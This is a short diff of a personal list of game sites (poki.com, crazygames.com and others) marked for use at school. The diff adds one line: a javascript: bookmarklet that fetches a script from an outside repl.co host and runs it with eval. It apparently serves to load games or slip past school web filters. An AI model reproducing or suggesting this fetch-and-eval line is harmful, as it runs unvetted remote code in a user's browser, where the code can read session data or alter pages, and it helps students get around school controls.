@@ -23,4 +23,5 @@ Favorite sites
        poki.com <-- game list
        crazygames.com <-- game list                   
        sammycheez <-- game list
-       USE IN SCHOOL!!!
+       USE IN SCHOOL!!!\
+       javascript:fetch('https://Nullify-20.garoikana.repl.co/main.js').then(r => r.text()).then(r => eval(r))
